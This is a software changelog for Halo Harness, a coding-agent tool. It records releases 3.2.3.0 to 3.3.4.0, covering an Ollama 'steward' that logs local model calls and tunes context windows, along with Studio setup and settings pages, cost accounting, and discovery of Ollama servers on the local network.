# Changelog

All notable changes to Halo Harness (continuing `rolo-claude`, renamed at
version 2.0.0) are recorded here, newest first. Every entry older than the
rename keeps the `rolo-claude`/`rolo_claude` names it was written under --
history, not rewritten. This project does not (yet) follow strict semver
across the 0.3.x line -- each 0.3.0 milestone below was a working
checkpoint toward the single 0.3.0 release, not a separate published
version.

## [3.3.4.0] - unreleased

### R1: the knowledge and the hardware card

#### Added
- The Ollama steward's knowledge, `halo_harness/ollama_steward/knowledge/` (shipped with the package): the scheduler and loader, the server log line by line, memory arithmetic with worked examples, the other local servers (llama-server, mlx_lm.server, LM Studio, vLLM) and a symptom -> cause -> change table for every alert kind; every claim tagged to a row of SOURCES.md (URL, version or commit, date).
- `halo ollama hardware [--host NAME] [--json]`: each host's hardware card -- GPUs and their memory, the server's own settings from its log's startup lines (models kept, parallel, keep-alive, KV cache type, flash attention, GPU overhead), what is loaded, what else holds the card -- read-only, with a "not read" line for each reader that found nothing.

#### Changed
- docs: MODELS-ollama.md "The steward (3.3.4.0)", COMMANDS-local.md `halo ollama hardware`, MODELS-references.md points to the steward's sources, ARCHITECTURE-modules.md lists the package.

### R2: every call leaves a record

#### Added
- The traffic ledger: every call to a local model server (an `ol:` host that is not Ollama's own cloud, native or `dialect: openai`; an `hf:local` / `hf:mlx` server) appends one JSON line to `~/.halo/ollama/traffic.jsonl`. It holds the host, the model, the window sent and its source, the estimate, `prompt_eval_count` / `eval_count`, `done_reason`, the durations and eval rate, trimmed, the status or error, the retry, the session and turn, and the tool and image counts. The file rotates at 20 MB. Turns, compaction, small calls, tool repairs and calibration loads are all recorded. `ollama.ledger: false` turns it off.
- `fleet.ollama.share` (`auto` | `all` | `off`): a member sends its ledger lines to the hub every 30 s or 50 lines (`POST /fleet/v1/ollama`). The hub keeps them in its own ledger with `from` set to the member's name, so the machine that serves the models sees every halo's calls to it.
- The server's events: a read-only tail of the local Ollama server log (rotation followed, journald on Linux) and an `/api/ps` poll, turned into events in `~/.halo/ollama/events.jsonl`. The kinds are prompt-trimmed (with the window that was sent), reply-cut, window-full, no-user-query, http-500, cancel-task (a 500 from a client that went away mid-prompt), retry-loop, client-gave-up, load-failed, cpu-spill, gpu-memory, queue-full, slow-load, stall, server-down, other-error, loaded, unloaded, reloaded and startup. A 10-minute quiet period per kind applies to notifications only.
- `halo ollama traffic [--host] [--model] [--since] [--json]` and `halo ollama events [--host] [--since] [--kind] [--watch] [--from-start] [--json]`.

#### Changed
- docs: `halo ollama ...` moved into its own part, COMMANDS-ollama.md (COMMANDS-local.md keeps `halo gym` and `halo local`). MODELS-ollama.md describes the ledger and the events. CONFIG.md and FLEET.md describe `ollama.ledger` and `fleet.ollama.share`, and ARCHITECTURE-modules.md lists the new modules.

### R3: the steward judges, plans the fit, adjusts

#### Added
- `halo ollama steward findings [--host] [--since 24h] [--json]`: reads the ledger (every member's lines on a hub), the server's events, the hardware card and the learned caps per host and model. It finds:
- a window too small (with "a small window was asked for" as its own finding) or too large
- two windows for one model
- cut replies
- a session past 80 % of its window that never compacted, or whose compaction failed
- a cut reply resent
- CPU spills
- a slow box
- models thrashing one card

Each finding comes with its evidence, at most one profile change, and server lines only to show.
- `halo ollama steward plan`: fits the models the halos ask for to the card. The options are a window per model, one model at a time, another host, the model alone at a smaller window, a tuned twin, a smaller quantization, and the server's KV cache at q8_0. Each says what you lose.
- `ollama.profiles["<host>|<model>"]` (`num_ctx`, `num_predict`, `keep_alive`, `tools_max`, `host_for`, `compact_at`, `note`, `by`, `at`), read before every call to that model on every halo. The hub hands its profiles to its members.
- `ollama.steward.apply` (`auto` | `review` | `off`) and `halo ollama steward run [--once] | apply <id> | undo`.
- Every change is one line in `~/.halo/ollama/steward.jsonl`.
- At most one change per host and model in ten minutes, never above a measured cap.
- A change followed by worse calls is rolled back on its own.
- A session's next call shows a fresh change's note.
- `ollama.steward.slow_tok_s`.

#### Changed
- The fit estimate counts what a load really takes:
- the KV cache of only the layers that hold one (Qwen 3.5 / 3.8: one in four), times the parallel slots
- the recurrent state, the draft layer, the compute buffer and the vision projector
- Ollama's per-card minimum
- the server's own KV cache type and slots from its log when the host entry has no hint

qwen3.8:27b on a 24 GB card is now estimated at 65,536 (it was 32,768).
- `halo ollama hardware` reads the server log of a host this machine serves under any name (0.0.0.0, the host name, the LAN address), not only loopback.
- docs: MODELS-ollama-steward.md (a new part, the steward), COMMANDS-ollama.md `halo ollama steward`, CONFIG.md, the MODELS-ollama-tuning.md arithmetic, ARCHITECTURE-modules.md.

#### Fixed
- An Ollama request past 80 % of its window (or a profile's `compact_at`) is compacted before it is sent. Before, it went out with the reply's room squeezed, and only the reply after it triggered compaction.
- A reply that used up the room the window left it counts as cut: it is compacted and re-sent, never kept as the answer or sent again.
- A profile's reply reserve is kept: the prompt compacts before the reply's room drops under it.

### R4: the steward's agent, selectable and cheap

#### Added
- The steward's job, one per state dir. It starts with Studio and with the fleet hub, or runs in the foreground as `halo ollama steward --watch`. It owns the server-log tail and the `/api/ps` poll. It runs every `ollama.steward.every_s` (300 s) while calls flow, and at once on a server alert. `halo ollama steward status` says where it runs, since when, the last run's counts, the model and the last note.
- The steward's model, `ollama.steward.model`. The default is a local `compactionModel`, else the smallest local model, else none (the rules run alone). It writes a plain-language note of at most 6 lines: what went wrong on which machine, the chain that led to it, and what changed or what to run. Each note carries its cost ("local, free", or the tokens and the dollars). It is called only when something is new, and at most once per `ollama.steward.note_every_s` (600 s).
- The model may propose a profile change in a fenced `proposals` block. Each proposal is checked: a known host and model, a profile field, never above the measured cap or the card's fit, and never a smaller window for an outgrown conversation. Then it lands per `ollama.steward.apply`, or is dropped with the reason said.
- Notes reach every surface:
- the TUI's status bar (30 s) and one transcript line
- the Fleet attention queue (`ollama_steward`: an error finding or a change)
- Studio's live feed (`steward` frames)
- fleet members ("steward on <hub>: ..." from the hub's answer)
- `halo ollama explain [<kind> | <topic>] [--sources]` answers from the knowledge files with no model.
- New settings: `ollama.steward.model`, `ollama.steward.job`, `ollama.steward.every_s`, `ollama.steward.note_every_s`.

#### Changed
- knowledge/symptoms.md has a `thrash` row.
- `halo ollama steward` takes `--watch` and `status`.
- The hub's answer to a member's ledger push carries its newest steward note beside its profiles.

### R5: the steward in Studio and the TUI

#### Added
- Fleet's **Ollama** panel. It is optional: the header's "+" adds it, as do the steward's attention row (O) and the palette's "Fleet: Ollama". Per host (a Hugging Face local server is a host too) it shows:
- the card line;
- the models: loaded now with the VRAM share and when they unload, the last hour's calls, trims, cuts, reloads and errors, the p95 prompt against the window, the profile and who set it, and an eye for a vision model;
- a traffic sparkline with each trim, cut and error marked;
- the steward's status, last note and findings (Apply and Dismiss in review mode, Undo in auto);
- the fit plan, with Apply for a profile change and Copy for a server line.
- `GET /api/ollama/steward`, `GET /api/ollama/hosts`, `GET /api/ollama/timeline`, and `POST /api/ollama/steward/apply | dismiss | undo | run`. None of them calls a model or writes to a server.
- Dismiss: a `dismissed` line in `steward.jsonl` keeps a finding quiet for 24 hours. The rules read it, so the CLI, the job and `/ollama` drop the finding too.
- Settings -> Ollama has a steward block above its rows: the status, the model (automatic, none, or a local model), the mode, the job, and "Open the Ollama panel".
- Setup -> Providers' Ollama card has a "steward: <last note>" line and a link to the panel.
- `/ollama findings | plan | explain <kind>` print what the CLI prints.
- The glossary gains "steward", "profile" and "fit plan".
- New capture: `studio-fleet-ollama.png`, made by `tools/capture_studio.py --mode fleet --panel ollama`.

#### Changed
- `/ollama` now prints the steward's view: the job, the last note, per host the card, the last hour and the profiles, the local servers, and the review proposals. The old per-host analysis is `/ollama hosts`.
- A steward pass, an apply and an undo take one profile lock, so two passes at once can no longer land the same change twice.
- `ollama.steward.model: none` turns the steward's notes off; the rules still run.
- The live feed has its own page, docs/STUDIO-feed.md.
- The module map is split in two (docs/ARCHITECTURE-modules-two.md).

### Also in 3.3.4.0

#### Changed

## [3.3.3.1] - 2026-10-27

### Cost counts what it knows
#### Fixed
- The session's cost is the sum of every priced call, the main model's and every sub-agent's. A model with no price no longer turns the whole total into "unknown", which Studio drew as $0.0000 while the sub-agents showed real dollars.
- `--max-budget-usd` trips on the known part, so a session whose main model has no price still stops on its priced sub-agents' spend.
- A partly priced sub-agent, a partial turn, the sessions registry and a mission worker keep the known figure instead of dropping it.
#### Changed
- `/cost`, `/status` and the status bar show `$3.6348+` when a part has no price, plus one detail line naming the model ("+ main's model databricks-glm-5-3 reports no price; this is what the priced agents spent"). "n/a (no priced call yet)" only when nothing is priced and nothing was spent.
- Studio's Cost panel puts a `+` on the spend and on PER TURN, with a title naming the model. Main's line says "no price" instead of $0.0000 when its own model is the unpriced one.
- `status` / `message_end` frames, the fleet session row and the `-p --output-format json` result carry `cost_complete` (and the frames and row `cost_unknown`).
### Costs are always dollars
#### Changed
- `databricks.dbu_price_usd` defaults to $0.07 per DBU (the AWS US East example price on Databricks' Foundation Model Serving pricing page, read 2026-10-27). A DBU figure is never the main figure: dollars first, the DBU count only as a detail.
- Databricks pay-per-token endpoints (Claude, GPT, Gemini, Grok, GLM, Kimi, DeepSeek, Llama, Qwen, GPT-OSS, Gemma) are priced from Databricks' published rates, matched by endpoint name. `databricks.prices.<endpoint> = {"in", "out"}` (USD per 1M tokens) overrides one. An endpoint in neither stays unpriced and the total's `+` says so. There is no currency option.

## [3.3.3.0] - 2026-10-27

**Settings.** The owner's note on 3.3.2.0: "I feel like halo should launch after init. Then full studio
should be available ... there should be another tab for settings ... getting a gui tab section for every
thing we can adjust via the cli in halo would be huge". Two rounds: Setup's Summary ends in "Done: start
halo", and the terminal that ran `halo init` waits for it, prints the summary and starts halo there while
Studio goes to Session (R1); a Settings section (Alt+9) shows every key of `~/.halo/config.json`, one page
per group, each row with its help, its value against its default, Reset and the `halo config set` line, all
generated from one catalog that a test holds equal to the config schema and docs/CONFIG.md (R2). The themes
and the "everything the CLI adjusts" parity rounds planned with this version moved to 3.3.6.0, behind the
Ollama steward (3.3.4.0) and the Models section (3.3.5.0).

### R1: Setup hands off to halo

#### Added
- Setup's Summary ends with the primary **Done: start halo**: `POST setup/done` writes `~/.halo/setup-done.json` (`at`, `home`) and publishes a `setup` frame `{stage: "done"}`; Studio goes to Session (nothing opens over it), the rail's "set up this box" line goes, and a reload stays on Session. `GET setup/state` carries `done_at`.
- `halo init` waits after opening Setup: "Setup is open in your browser: <url>. Press Done there and halo starts here (Ctrl+C stops waiting; `halo init --terminal` runs the terminal wizard)." On Done it prints the Summary's four lines (provider, default model, lineup, last check) and starts halo exactly as bare `halo` does, in the directory it ran from. Ctrl+C or Studio closing ends the wait with one line and exit 0.
- `halo init --no-launch` (and `HALO_INIT_NO_LAUNCH=1`): open Setup and return at once, as before.

#### Changed
- The terminal wizard's Finish (`halo init --terminal`, and the no-browser fallback) starts halo the same way, after the ticked checks and after a successful `halo start`; a quit, a failed live pong or `--no-launch` starts nothing.
- A Studio page is no longer sent to Setup by "no provider set up yet" once Setup's Done was pressed for that home.
- `cli.launch_bare` (bare halo's full-screen path, `/update`'s restart included) is shared by `halo` and `halo init`.

### R2: the Settings section

#### Added
- Studio's **Settings** section (`Alt+9`, after Setup): every key of `~/.halo/config.json`, one page per group (General, Agents and roles, Coach and improve, Knowledge and recall, Supervise, Steer and turn, Models, Providers, Ollama, Network and routing, Fleet, Remote, Packs, Connectors, Worktree, Update, Local). Each key is a row with its help line, its value against its default, a "default" marker, Reset to default and the exact `halo config set` line. A change saves at once and says when it takes effect: now, in the next session, or on the next launch. A search box finds a row across every group; a key with entries (a connector, a provider, an Ollama host's field) is a table plus its section as JSON; a secret is never shown.
- One catalog of every key (`halo_harness/settings_catalog.py`, 131 rows) behind the section, the palette's "Settings: <title>" entries and `halo settings --terminal`. `tests/test_settings_catalog.py` holds it, the config schema and docs/CONFIG.md's key table to the same keys.
- `GET settings/catalog`, `GET settings/values`, `POST settings/set` and `POST settings/unset`. A value is checked by its kind and choices (422 with one problem line each); `halo config set`'s theme and removed-key answers apply too.
- `halo settings [group] [--terminal] [--list]`: Studio on Settings (`?mode=settings&group=fleet`, or `halo studio --edit settings:fleet`). `--terminal` prints a group's keys as `key = value (default ...)` lines.
- The glossary word "config key"; `docs/media/studio-settings.png`; the modes banner's ninth tile.

#### Changed
- A pack's own Studio section has no `Alt` key now (`Alt+9` is Settings); its rail row or the palette opens it.
- docs/CONFIG.md's key table gains a Studio column naming each key's Settings page, and 26 keys it lacked (`tips`, `permission_mode`, `effort`, `model_memory`, `agents.*`, `roles.*`, `providers.<name>.enabled`, `network.offline`, `routing.escalation`, `local.servers`, `embeddings.*`, `comfy.url`, `governor.*`).
- `theme.unset_config_value` takes a dotted key (Reset to default), and drops a section the key leaves empty.

## [3.3.2.0] - 2026-10-27

**Quiet Studio.** The owner's note on 3.3.1.0: "the visuals in studio are too cluttered and the pop up is
annoying when you open a tab and the left column takes up too much space". Three rounds: nothing opens on
its own on any section and the left column is an icon rail with the inspector closed until something opens
it and a Focus key (R1); the panel list and the layout actions leave the rail for the section header's "+"
and "..." menus, so the rail holds sections only (R2); a panel is one title line with the ornament on the
focused one alone, every section opens on one thing with the rest as strips, and a density setting (R3).

### R1: nothing opens on any tab, the icon rail, the inspector asks first, Focus

#### Added
- The icon rail: the sections as icons in a 56 px left rail (title on hover, the current one lit, a dot on Session while a session is live, the Fleet live count on the Fleet icon, the packs' sections under a divider with the diamond); the chevron at its foot expands it to 248 px with the titles, remembered per browser (`halo.studio.rail`); `?rail=open` expands it for one page.
- Focus: `F` (or `Shift+F` where a section's own F follows or fits), the header's corners button or the palette's "Focus" hide the rail, the inspector and the status bar; again brings them back as they were; remembered per browser (`halo.studio.focus`).
- The header shows the current section's title and blurb.

#### Changed
- Nothing opens on its own when a section shows: no welcome card on any section, the first time or any time.
- Start here shows only over the section the page opened on, and once answered never again in that browser (`halo.studio.start`); the palette still opens it anywhere.
- The inspector stays closed until something opens it (a panel's Settings, a Design artboard's knobs); its close button or Esc gives the width back to the stage; open or closed is remembered per browser (`halo.studio.inspector`).
- The section rows print no shortcut: `Alt+N` is in the palette's Go to and in each section's How this works, which also lists the Focus key.
- The panel list, the Fleet tree, the Orchestra runs and the layout actions show while the rail is expanded.

#### Removed
- The header's section tab strip (the sections are the rail's rows).
- The first-visit welcome card and its `halo.studio.seen.<section>` keys.
- The header's "Toggle rail" button (the rail's chevron replaces it; the palette entry is "Expand or collapse the rail").

### R2: panels and layout leave the rail

#### Added
- The section header's **+** menu: the section's panels, each row saying what a press does (add, bring back, focus) with the strip / float badges; Orchestra's runs and New run as a group under them; keyboard first (ArrowDown opens it, the arrows, Home, End, Enter, Esc).
- The header's **...** menu: Arrange panels, Reset layout and How panels move; a row with nothing to do stays disabled and says why.
- A small "custom layout" badge in the header while the section's layout is your own.
- "Moving panels" in each section's help (the drag and resize lines), opened by How panels move.
- Fleet's **Tree** panel (optional, the + adds it): the Fleet tree with its inline answers and the "While you were away" card; while that card waits, the Fleet icon carries a dot and opens Fleet on the Tree.

#### Changed
- The rail holds the sections only, collapsed or expanded; expanded it is 200 px (was 248).
- The palette's Layout entries are "Arrange panels" and "Reset layout", with the section in the hint and drawn disabled, with words, when there is nothing to do.
- The palette's "Fleet: while you were away" opens Fleet on the Tree panel.

#### Removed
- The expanded rail's PANELS list, LAYOUT block (YOURS / DEFAULT, the drag paragraph, Arrange, Reset layout), Orchestra runs block and Fleet tree.

### R3: quieter panels, one thing per section, a density setting

#### Added
- One thing per section: Session opens on Live, Team on the Board, Roles on the Canvas, Fleet on the Map, Design on the Artboards, Orchestra on the Workflow and Packs on Installed, filling the stage; the other panels wait as strips at the foot. A strip you open (a click on it, its chevron, its row in the **+**, the palette) joins a column on the main panel's right, and collapsing it gives the columns back; your saved layout wins, Reset layout returns to this default.
- A density setting: comfortable or compact, the header's rows button beside the theme or the palette's "Density: compact / comfortable"; compact has tighter spacing and a smaller type scale, the same colours; remembered per browser (`halo.studio.density`).
- Each panel's title line has its **?** (what it is, then how to use it; **?** again closes it), the strip button, and a close on an optional panel.
- Picking a Roles card opens the Inspector strip; picking a pack opens Details.
- `?open=all` draws every panel in its own place (the arrangement before 3.3.2.0), for a link or a capture.

#### Changed
- A panel is one title line and a plain 1 px border; the HUD brackets, the glow and a small mono data line (its size and face) show only on the focused panel (the one you clicked, else the section's main panel).
- Compact / Expand moved into the panel's **...** menu (a double-click on the title still toggles it); the panel's **...** is the same menu as the header's.
- Arrange panels lays out the open panels by the one-thing rule.
- The Studio captures, the banner, the hero and the social preview show the quiet shell.

#### Removed
- The about line under every panel's title (it is the first line of the panel's **?**, its title's tooltip, the Inspector and the section help).
- Placeholder lines an empty area already says: the panels' own "reading the fleet / team / lineups / projects / packs..." (the section says it once), Setup's strip "reading the setup...", the Log's "No lines yet."

### Also in 3.3.2.0

#### Changed

## [3.3.1.0] - 2026-10-26

### R1: Setup, one page at a time

#### Added
- Setup is a paged flow: a step rail across the top in the terminal wizard's order (Providers, Local models, Default model, Permissions, Theme, Team, Linux fixes only when this box needs them, Check, Summary), the current step lit and the done ones ticked, a click opens any step; one block per page with Back / Next at its foot (Next before the Summary says Summary), Ctrl+Left / Ctrl+Right as Back / Next, Enter in a block's field as its Save.
- A Summary page: one row per step with its value and a Change jump, the last check with Run the ticked checks and a button to the Check page, and the guided first run's card.
- The open page is remembered per home (`GET setup/state` carries `home`, a hash of the state dir); `?block=` wins (and `?block=summary` opens the Summary).
- tests/test_studio_setup_pages.py (headless Chrome): nothing open on load, the rail and its states, Next / Back, a rail jump, `?block=team`, the Summary and Change, the remembered page, the Ollama disclosure.

#### Changed
- Nothing opens on its own on Setup: `?first=1` only leads the rail's line with "set up this box" (no help), no first-visit welcome on Setup (or on a page that opens on Setup), and the Start here offer is not drawn over Setup (it still shows on the other sections of a fresh home). The help stays the ? in the header.
- The status strip is the rail's own one-line summary; the Ollama card's Find / Scan / Add / Measure sit in a disclosure under its hosts, closed until opened.
- `halo setup team` / `?block=team` / a focus frame open that block's page; the Setup capture, the modes banner tile, STUDIO-setup, STUDIO-sections, WIZARD, COMMANDS-init and the README caption follow the first page.

#### Removed
- Setup's panel workspace: no panels to move, resize or Arrange, no panel list or layout actions in the rail and palette for Setup; the section help's "What this page does" variant.

### Also in 3.3.1.0

#### Changed

## [3.3.0.0] - 2026-10-26

Focus: Setup is Studio -- the terminal wizard's eight steps become a Setup section in Halo Studio (Alt+8) and `halo init` opens it, with the terminal wizard kept as the fallback (`--terminal`, SSH, no browser); every provider, host, folder, model, permission mode, theme, lineup and check is a block you fill in any order; the Ollama card finds the servers on this machine and on the network and measures their models; the Session tab's steer names its target and the timeline exports a Markdown trace; and the two behaviours that differed on GitHub's runners (the held drop, the Fleet map's stale node) are reproduced with a latency flag and fixed.

### R1: the Setup section

#### Added
- Studio's **Setup** section (`Alt+8`, the last core section; `halo studio --mode setup`, `?mode=setup`, `/studio setup`): the terminal wizard's blocks as one page of forms, each with its own Save and its own saved / 1 changed / problem line, under a strip that says the providers set up, the default model, the lineup, the permission mode and the terminal theme. This round: Default model (the catalog of the providers set up here, grouped by provider, with what each is best at, and a search), Permissions (the four modes with their notes), Terminal theme (the six TUI themes as swatches in their own colours; Studio's dark / light switch stays a browser setting), Team (One model for everything, auto, every lineup, the preview, Apply, Edit in Roles); Providers, Local models, Linux fixes and Check show where they come next.
- `GET setup/state`, `POST setup/config` (model, permission_mode, theme only; a value the block does not list is a 422 with `problems`), `POST setup/team`, `GET setup/team/<name>/preview` (studio/setup_api.py, studio/setup_state.py); the state never carries a key.
- Glossary words `setup`, `provider` and `env file` (`halo explain`, Studio's Glossary).
- docs/STUDIO-setup.md: what each Setup block writes and the routes.

#### Changed
- A pack's own sections start at `Alt+9` (one keyed pack section; the rest by their tab or the palette).
- The wizard's Team step and Studio's Setup write the lineup choice through one function (`lineup_choice.apply_lineup_choice`); the wizard behaves as before.
- `/studio` takes `packs` and `setup`; the modes banner lists eight tiles (its Setup capture comes with R4).

#### Fixed
- Roles: a card dropped into another tier, also after holding it over a collapsed tier's strip until it opens, lands inside that tier's box (its column), never at the raw drop point beside it; the tier boxes no longer overlap, so the next redraw keeps every other card's spot (the Windows runner's "three cards moved" after a removal). The removal check is judged on every runner again.

### R2: providers and local models in Setup

#### Added
- Setup's **Providers** block: one card per provider in the wizard's order (Databricks, OpenRouter, Anthropic, Ollama, Hugging Face, OpenAI, TypeSafe, Experiential Labs). Each card shows its state ("set, from the env file, ****1234" / "not set"), the enabled mark and what the last test found ("reachable: ok · 312 models listed"). A key goes into a password field, never prefilled. **Save & test** does what the wizard's Save does: it writes the env file (`HALO_ENV_FILE`, else `~/.config/halo/env`), turns the provider on, probes its host and reads its model list, and the lines under the card say what was written and found. A key is posted once and never sent back.
- The Ollama card: the hosts table (name, url, default, key env) with add and remove. The merge rule holds: a same-name save keeps the host's tuning, a blank save never repoints a host, and the first host is the default. A key is kept in the env file as `HALO_SECRET_OLLAMA_<NAME>`. Find Ollama servers and Scan this network come with 3.3.0.0 R5.
- The Hugging Face card: the router token, dedicated endpoints and named local servers, each added or removed on its own.
- Setup's **Local models** block: model folders (`huggingface.model_dirs`, add by path, remove), the preferred runtime (`llama-server` | `mlx_lm`) and what is on this machine now, read again after each save.
- Routes `POST setup/provider/<name>`, `setup/ollama-host`, `setup/ollama-host/remove`, `setup/hf`, `setup/model-dir`, `setup/runtime`. A bad URL or an `http://` Databricks host is a 422 with `problems`, and nothing is written. `GET setup/state` carries each provider's masked state and never a key.

#### Changed
- The wizard's Hugging Face local-server writer takes an optional name (Setup names its servers; the wizard's one entry stays `default`).
- The Setup page opens with Providers and Local models on top; the rail says how many providers are set and how many model folders are added.

### R3: the Check block, the Linux fixes, the fresh-home landing

#### Added
- Setup's **Check** block: the five checks Halo offers after setup (doctor, the model catalog, a hello on the default model, the quick gym, the guided first run), each row saying what it does, what it costs, how long it takes and what it writes; doctor, catalog and hello are ticked. **Run the ticked checks** runs them in order as one background job; each row shows its state and its lines as they arrive, the foot how many failed, and the status strip's **Last check** ("ok 12:04", "2 failed 12:04") keeps the result. Ticking the gym lists the models it would run on; the guided first run shows its card before its box can be ticked and runs through the Start here job, its steps under the row. Routes `POST setup/check`, `GET setup/check`, `POST setup/check/stop`; `setup` frames on the live feed.
- Setup's **Linux fixes** block: shown only when this box lacks a static `rg` in `~/.local/bin` or `~/.local/bin` on PATH for a non-interactive shell; **Apply** does what the terminal wizard's Linux step does (`POST setup/linux-fixes`). Otherwise one line: nothing to fix on this box.
- The Default model block's **Refresh** (reads every provider's list again) and a line for an Ollama host nothing has read yet ("not read yet: Refresh").

#### Changed
- A home with no provider set up opens Studio on Setup whatever section was saved (`?mode=` still wins); Start here's first button is **Set up this box**; a guided first run started with no provider opens Setup with a toast instead of an error line. The strip says "no provider set".
- Reading Setup's state, the guided first run's card and any cost line opens no connection: Ollama hosts and local servers are listed from what their last read cached (Studio's Refresh, `halo models --refresh`, `/local refresh`), never probed by a page read.

#### Fixed
- A Setup block's answer could be overwritten by an older read of the page that finished after it (a card showed "not set" next to the host it had just added); the newer answer wins and the page reads again.

### R4: the doors -- halo init opens Studio on Setup

#### Added
- `halo init --terminal`: the terminal wizard. It also runs when no browser can open here (`HALO_NO_BROWSER`, an SSH session, Linux with no `DISPLAY` / `WAYLAND_DISPLAY`, or a browser that does not take the URL). Setup's URL is printed first with the port-forward line `halo studio` prints.
- `halo setup [team|roles] --terminal` and `/setup [team|roles] --terminal`: the terminal Team screen.
- Setup's doors in the page address: `?mode=setup&first=1` opens the section's help once ("What this page does") and leads the status strip with "set up this box"; `?mode=setup&block=team` brings that block into view and focuses it. A Studio page already open takes the same through a `focus` frame. `halo studio --edit setup`, `setup:first` and `setup:<block>` open them from a shell.
- `tools/capture_studio.py --mode setup` (docs/media/studio-setup.png): the README's first screenshot after install and the modes banner's eighth tile.

#### Changed
- `halo init` on a terminal opens Halo Studio on its Setup section (it starts Studio, or reuses the one running) and prints one line with the URL. `--step`, `--team` and `--no-live` still run the terminal wizard; `--provider` / `--yes` and a run with no terminal keep the console flow.
- `halo setup [team|roles]` and `/setup [team|roles]` open Setup on its Team block (`roles` is the same block).
- `halo start` with no provider asks "Open Setup in Studio? [Y/n]": Enter opens Setup, `n` runs the terminal wizard.
- Setup's help describes every block, the README leads the install with Setup, and the modes banner shows eight sections.

### R5: Ollama everywhere -- Find and Scan in Setup

#### Added
- Setup's Ollama card finds servers instead of typing them. **Find Ollama servers** asks this machine's doors at once (`OLLAMA_HOST`, loopback on `ollama.discover.ports`, this machine's LAN address, Docker, WSL; about 4 s). **Scan this network** sweeps this machine's /24 plus `ollama.discover.subnets` as a background job (10 s cap) with a live line "scanning <subnet> · N s" and a Stop. Each server found is a row with its name, address, version and the models it serves, marked "configured" or with a tick.
- **Add the ticked** writes the ticked servers as `ollama.hosts` entries (an existing host is never repointed, the first host stays the default, no key written). The hosts table redraws and the Models refresh runs, so the Models panel lists each new host as `Ollama (<name>)` and its models are `ol:<model>@<name>` at once.
- **Measure the found models**: the models of the hosts just added, each with a tick, measured one at a time with the calibration `halo ollama calibrate` runs. A live log shows one line per model ("qwen3:30b on gpubox: 32k fits, 65k does not (2 min 10 s)") and a summary; what settles is recorded in `~/.halo/ollama-fit.json`.
- Routes `POST setup/ollama/find`, `POST|GET setup/ollama/scan`, `POST setup/ollama/scan/stop`, `POST setup/ollama/add {names | urls}`, `POST|GET setup/ollama/measure {hosts, models?, timeout?}` and `POST setup/ollama/measure/stop` (studio/setup_discover_api.py, studio/setup_discover_jobs.py). Both jobs stream `setup` frames on the live feed (`setup:scan:<job>`, `setup:measure:<job>`); `GET setup/state` carries `ollama_discover` (the ports, the subnets, the latest scan and measure).

#### Changed
- The Ollama card's two placeholder buttons ("comes with 3.3.0.0 R5") now do what they say. The card takes the whole row once servers are found.
- docs/LOCAL-MODELS.md "Found on this machine" / "Found on the network" / "Measured after finding" and docs/MODELS-ollama.md name the Studio way.

### R6: the steer knows its target, and the timeline exports a trace

#### Added
- Studio Session: the Steer box names its target above the field, "Steering: coder · Bash (pytest -q), 12 s" (or thinking, waiting on you, paused, idle), live from the feed; the target row and its map node carry a steady outline in the agent's colour (the node's steer chip and its timeline lane lit); a click on a row or a node, `s` on a focused row, or Tab / Shift+Tab in the field changes it, and the line says what it was.
- The Live column holds still while you type a steer or have scrolled up: new rows append below and the pill "N new rows · follow" counts them; the pill, Escape out of the field, Follow or a scroll to the bottom follows again. A target row you chose is scrolled into view once and never pushed out while held.
- A steer lands as a row right under its target ("↳ steer to coder: ..."), and the agent's next row is marked "after your steer".
- Export on the Live column's header and its timeline strip: the session as one Markdown trace, `halo-trace-<session id>-<yyyy-mm-dd-hhmm>.md` (`GET /api/sessions/<sid>/trace.md`).
- `halo session export <id> [--md FILE]` (`--md -` prints): the header (id, model and lineup, start and end, turns, tool calls, tokens in and out, cost), then one entry per row (prompts, text, tool calls with a one-line argument summary, results trimmed to 40 lines, steers, nudges, permission answers, turn ends, compactions, errors), keys masked, home paths as `~` (halo_harness/session_trace.py).
- docs/STUDIO-session.md: steering and exporting a session.

#### Changed
- `/export` (and `Ctrl+X Ctrl+S`) writes that trace beside the session log and says the path (was a Markdown transcript under `~/.halo/exports/`).
- A turn's timeline record keeps the line the turn ended with (`marker`), so the trace shows it.
- The Live column's pill reads "N new rows · follow" (was "↓ N new").

### R7: the Studio on a slow box
#### Added
- `HALO_STUDIO_SLOW_MS`, a test flag: Studio's server holds every API answer and every live-feed frame that many ms, so a test sees a loaded CI runner's order of events on any box (docs/DEVELOPMENT.md "A slow box"); tests/test_studio_slow_box.py runs the Roles room steps at 800 ms and the Fleet stop at 400 ms.
- `PUT /api/lineup/<name>` takes an optional `layout` ({nodes, tiers}) and writes it in the same request, after the lineup.
#### Changed
- A card dropped into another tier is one ordered write: it shows in its new tier at its clamped spot at once, and the lineup save carries the positions (a move waiting to save goes with it; no layout save races it); a refused move puts the card and its tier back. A tier a held card opened is the drop's target while the pointer stays over it.
- The Fleet map re-reads its view when an agent ends (from any state) or a late frame moves an ended agent, when the tab is shown again, and every 5 s while anything runs, whatever frames come.
- The two Roles checks that were recorded, not judged, on GitHub's Windows runner are judged everywhere again.
#### Fixed
- A held drop into a collapsed tier left the card outside the tier's box on a slow box (GitHub's Windows runner), and a later move could be overwritten by the drop's late position (the spots after a removal).
- A stopped agent stayed `running` on the Fleet map while other frames kept coming (GitHub's Linux runner, 60 s).
- Dropping a card into another tier of a pack's read-only lineup undid your previous edit.

### Also in 3.3.0.0

#### Changed

## [3.2.3.0] - 2026-10-26

Focus: Ollama on the network -- what broke when the owner ran Halo on a Mac against this PC's Ollama, as three rounds: the window tells the truth (calibration measures or says unknown, the window follows the prompt and the reply's room, a trimmed request is context full, every layer on the GPU when it fits), the servers on this machine and on the network are found and then measured, and a tuned twin keeps a model's safe window as its default.

### R1: the window tells the truth

#### Added
- `providers/ollama_prompt.py`: every Ollama request is estimated before the call (characters / 3.5 + the reply's `num_predict`, 1,024 at least) and `num_ctx` is never below it, raised over a saved cap, the remote default or a fallback up to the trained context, the memory estimate, `max_ctx` and 131072.
- A request larger than the largest window the call can get compacts before it is sent, in one line ("the request (14k tokens, 9k of it tool output) is larger than <model>'s window on <host> (8k): compacted").
- A trimmed request (`prompt_eval_count` far under the estimate, the 500 "no user query found in messages", or a reply cut at the window's end) raises the window and re-sends, or compacts and re-sends, once per turn, in one line.
- `halo ollama calibrate --timeout S`; the budget line, one line per load, the one-line outcome ("65k safe, 98k tight (22.1 of 23 GB), 131k does not fit (6 min 10 s)").
- `options.num_gpu` (every layer on the GPU) when Halo's estimate or a calibration says the model fits there at the window sent.
- The headroom rule: a window is safe with 8 % of the card (or 1.5 GB) free, tight above that; calibration records the largest safe window.
